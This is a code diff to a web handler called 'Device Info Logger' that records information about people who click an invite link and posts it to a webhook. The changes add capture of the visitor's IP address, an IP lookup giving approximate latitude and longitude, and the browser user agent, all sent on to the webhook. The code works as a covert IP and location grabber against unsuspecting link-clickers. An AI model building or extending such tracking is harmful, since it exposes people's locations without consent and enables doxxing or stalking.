@@ -28,22 +28,32 @@ export default async function handler(req, res) {
     if (req.method === 'POST') {
         try {
             const deviceInfo = await req.json();
+            const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
+            // Get IP details, including approximate coordinates
+            const ipDetails = await getIpDetails(ip);
 
             const message = {
-                username: "Device Info Logger:",
+                username: "Device Info Logger",
                 embeds: [
                     {
                         title: "Device Information",
                         color: 0x00FFFF,
                         description: "Device info collected from user clicking the invite link.",
-                        fields: Object.keys(deviceInfo).map(key => ({
-                            name: key,
-                            value: `\`${deviceInfo[key]}\``,
-                            inline: true,
-                        })),
-                    },
-                ],
+                        fields: [
+                            ...(Object.keys(deviceInfo).map(key => ({
+                                name: key,
+                                value: `\`${deviceInfo[key]}\``,
+                                inline: true,
+                            }))),
+                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+                            { name: "Latitude", value: `\`${ipDetails.lat || "Not available"}\``, inline: true },
+                            { name: "Longitude", value: `\`${ipDetails.lon || "Not available"}\``, inline: true },
+                        ]
+                    }
+                ]
             };
+
             await sendToWebhook(message);
             res.status(200).json({ message: "Device info logged." });
         } catch (error) {
@@ -80,6 +90,9 @@ export default async function handler(req, res) {
                         { name: "Region", value: `\`${ipDetails.regionName}\``, inline: true },
                         { name: "City", value: `\`${ipDetails.city}\``, inline: true },
                         { name: "Timezone", value: `\`${ipDetails.timezone}\``, inline: true },
+                        { name: "Latitude", value: `\`${ipDetails.lat}\``, inline: true },
+                        { name: "Longitude", value: `\`${ipDetails.lon}\``, inline: true },
+                        { name: "Device Info", value: `\`${userAgent}\``, inline: false }
                     ],
                 },
             ],
